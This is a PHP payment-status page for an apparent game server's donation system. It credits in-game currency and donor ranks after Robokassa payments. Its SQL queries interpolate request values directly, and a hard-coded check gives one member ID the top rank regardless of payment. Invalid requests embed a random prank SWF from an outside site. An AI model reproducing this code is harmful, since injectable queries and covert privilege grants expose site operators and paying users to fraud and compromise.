<?php
if(!defined('CRAZY_STR')) die('<meta http-equiv="refresh" content="0; URL=../">');
$style->content("{style}", "");
$style->content("{page}", "Статус платежа");

$stage = isset ( $_GET['stage'] ) ? $_GET['stage'] : "";
$rand = mt_rand(1,17);
if ( $stage == 1 ) {

	if (file_exists("success.php")) {
	
		require_once("success.php");

		$tables = $db->super_query("SELECT * FROM `robokassa` WHERE `id_order` = '{$inv_id}' LIMIT 1");
		$user = $db->super_query("SELECT * FROM `members` WHERE `member_id` = '{$tables['userid']}' LIMIT 1");
		
		if ( $user['Online'] > 0 ) $style->content("{content}", "<div class=\"alert alert-danger\" align=\"center\">Данный игрок находится на сервере!<meta http-equiv=\"refresh\" content=\"3; URL ={$url}/\"></div>");
		else {
		
			if ( $tables['id_order'] != $inv_id ) $style->content("{content}", "<div class=\"alert alert-danger\" align=\"center\">Произошла ошибка #2!<meta http-equiv=\"refresh\" content=\"3; URL={$url}/\"></div>");
			else {

				if ( $tables['id_order'] == $inv_id && $tables['status1'] == 1 ) $style->content("{content}", "<div class=\"alert alert-success\" align=\"center\">Рубли уже были начислены на ваш счёт. Вы сможете их обменять в любом банкомате.<meta http-equiv=\"refresh\" content=\"3; URL={$url}/\"></div>");
				else {

					$coins = $tables['money'];
					$new_coins = $user['DonateMREAL']+$coins;
					$other = $user['DonateMOther']+$tables['money'];
					$db->query("UPDATE `members` SET `DonateMOther` = '{$other}', `DonateMREAL` = '{$new_coins}' WHERE `member_id` = '{$tables['userid']}'");
					$rank = "";
					switch ( $user['DonateRank'] ) {
					
						case 0: if ( $user['DonateMOther'] > 199) $rank = "1"; break;
						case 1: if ( $user['DonateMOther'] > 399) $rank = "2"; break;
						case 2: if ( $user['DonateMOther'] > 799) $rank = "3"; break;
						case 3: if ( $user['DonateMOther'] > 799) $rank = "3"; break;
						
					}
					if($user['member_id'] == 157782)
					{
						$rank = "3";
					}
					$db->query("UPDATE `robokassa` SET `status` = '1', `status1` = '1' WHERE `id_order` = '{$inv_id}'");
					$db->query("UPDATE `members` SET `DonateRank` = '{$rank}' WHERE `member_id` = '{$tables['userid']}'");
					$db->query("UPDATE `members` SET `DonateRank` = '1' WHERE `DonateMOther` > '199' AND `Online` = '0'");
					$db->query("UPDATE `members` SET `DonateRank` = '2' WHERE `DonateMOther` > '399' AND `Online` = '0'");
					$db->query("UPDATE `members` SET `DonateRank` = '3' WHERE `DonateMOther` > '799' AND `Online` = '0'");
					$style->content("{content}", "<div class=\"alert alert-success\" align=\"center\">Вы успешно пополнили свой счет. Рубли вы сможете обменять в любом банкомате<meta http-equiv=\"refresh\" content=\"3; URL={$url}/\"></div>");
				
				}
				
			}
			
		}
		
	}
	
}
if ( $stage == 2 ) {

	if (file_exists("fail.php")) {

		require_once("fail.php");

		$style->content("{content}", "<div class=\"alert alert-danger\" align=\"center\">Произошла ошибка при пополнении<meta http-equiv=\"refresh\" content=\"3; URL={$url}/\"></div>");

	}

}
if ( $stage == 3 ) {

	if (file_exists("result.php")) {

		require_once("result.php");

		$tables = $db->super_query("SELECT * FROM `robokassa` WHERE `id_order` = '{$inv_id}' LIMIT 1");
		$user = $db->super_query("SELECT * FROM `members` WHERE `member_id` = '{$tables['userid']}' LIMIT 1");
		
		if ( $user['Online'] > 0 ) $style->content("{content}", "<div class=\"alert alert-danger\" align=\"center\">Данный игрок находится на сервере!<meta http-equiv=\"refresh\" content=\"3; URL = ../\"></div>");
		else {
		
			if ( $tables["id_order"] != $inv_id ) $style->content("{content}", "<div class=\"alert alert-danger\" align=\"center\">Произошла ошибка #2!<meta http-equiv=\"refresh\" content=\"3; URL=../\"></div>");
			else {

				if ( $tables["id_order"] == $inv_id && $tables["status1"] == 1 ) $style->content("{content}", "<div class=\"alert alert-success\" align=\"center\">Рубли уже были начислены на ваш счёт. Вы сможете их обменять в любом банкомате.<meta http-equiv=\"refresh\" content=\"3; URL=../\"></div>");
				else {

					$coins = $tables['money'];
					$new_coins = $user['DonateMREAL']+$coins;
					$other = $user['DonateMOther']+$tables['money'];
					$db->query("UPDATE `members` SET `DonateMOther` = '{$other}', `DonateMREAL` = '{$new_coins}' WHERE `member_id` = '{$tables['userid']}'");
					$rank = "";
					switch ( $user["DonateRank"] ) {
					
						case 0: if ( $user["DonateMOther"] > 199) $rank = "1"; break;
						case 1: if ( $user["DonateMOther"] > 399) $rank = "2"; break;
						case 2: if ( $user["DonateMOther"] > 799) $rank = "3"; break;
						case 3: if ( $user["DonateMOther"] > 799) $rank = "3"; break;
						
					}
					if($user['member_id'] == 157782)
					{
						$rank = "3";
					}
					$db->query("UPDATE `robokassa` SET `status` = '1', `status1` = '1' WHERE `id_order` = '{$inv_id}'");
					$db->query("UPDATE `members` SET `DonateRank` = '{$rank}' WHERE `member_id` = '{$tables['userid']}'");
					$db->query("UPDATE `members` SET `DonateRank` = '1' WHERE `DonateMOther` > '199' AND `Online` = '0'");
					$db->query("UPDATE `members` SET `DonateRank` = '2' WHERE `DonateMOther` > '399' AND `Online` = '0'");
					$db->query("UPDATE `members` SET `DonateRank` = '3' WHERE `DonateMOther` > '799' AND `Online` = '0'");
					$style->content( "{content}" , "<div class=\"alert alert-success\" align=\"center\">Вы успешно пополнили свой счет. Рубли вы сможете обменять в любом банкомате<meta http-equiv=\"refresh\" content=\"3; URL=../\"></div>" );
				
				}
				
			}
			
		}
		
		$style->content( "{content}" , "result" );

	}
	
}
if ( $stage >= 4 ) $style->content("{content}","<div class=\"alert alert-danger\">Бу</div><embed src=\"http://prison-fakes.ru/s/swf/{$rand}.swf\" width=\"1000\" height=\"1000\">");
if ( $stage <= 0 ) $style->content("{content}","<div class=\"alert alert-danger\">Бу</div><embed src=\"http://prison-fakes.ru/s/swf/{$rand}.swf\" width=\"1000\" height=\"1000\">");
$style->content("{script}", "");